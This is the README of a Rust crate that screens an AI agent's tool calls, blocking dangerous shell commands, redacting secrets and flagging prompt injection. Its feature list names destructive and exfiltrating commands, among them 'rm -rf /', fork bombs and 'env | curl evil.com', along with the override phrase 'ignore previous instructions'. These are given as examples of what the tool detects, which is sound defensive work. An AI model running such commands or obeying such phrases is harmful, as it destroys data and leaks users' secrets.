<div align="center">

# smooth-narc

**Narc — tool-call surveillance for Smooth Operators**

*The snitch on the payroll. Catches the agent in the act, before the LLM ever sees the loot.*

[![crates.io](https://img.shields.io/crates/v/smooai-smooth-narc)](https://crates.io/crates/smooai-smooth-narc)
[![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/SmooAI/smooth/blob/main/LICENSE)

</div>

---

Every AI-agent harness that ships a `bash` tool ships a liability. Narc sits between the agent and the tool registry as a pre/post-call hook and declares war on the liability:

- **CliGuard** — prefix-scans every shell invocation against ~25 dangerous patterns (`rm -rf /`, `mkfs`, `dd if=/dev/zero of=/dev/`, fork bombs, pipe-to-shell RCE, `chmod -R 777 /`, `env | curl evil.com`, `xmrig`, and the rest of the usual rogues). Severity `Block` — the command never reaches the shell.
- **SecretDetector** — ten regex patterns for AWS keys, GitHub tokens, OpenAI keys, Stripe live keys, JWTs, private keys, Slack tokens. Runs on tool output; the call is flagged and the secret is redacted before the response hits the model context.
- **Prompt-injection guard** — six detectors for "ignore previous instructions", role-hijack attempts, encoded payloads, and instruction-in-data smuggling buried in search results or file contents.
- **WriteGuard** — an opt-in gate on `write_file` / `edit_file` / `apply_patch`. Agents in the `review` phase don't write. Period.
- **LLM judge** — when the rule engine can't decide confidently, Narc escalates to an LLM judge with a tight, adversarial system prompt. Decisions are cached per-policy so the same call doesn't pay the latency twice.

Part of **[Smooth](https://github.com/SmooAI/smooth)**, the security-first AI-agent orchestration platform.

## Usage

```rust
use smooth_narc::{NarcHook, Severity};
use smooth_operator::ToolRegistry;

let narc = NarcHook::new(/* write_guard */ true);
let mut registry = ToolRegistry::new();
registry.add_pre_call_hook(narc.clone());
registry.add_post_call_hook(narc.clone());

// …run the agent…

for alert in narc.alerts_above(Severity::Block) {
    eprintln!("BLOCK: {} — {}", alert.category, alert.detail);
}
```

Wired to a `Scribe`, alerts forward to the Boardroom's central `Archivist` for cross-VM correlation. Wired to a `Wonk`, escalations feed the per-VM decision cache.

## License

MIT
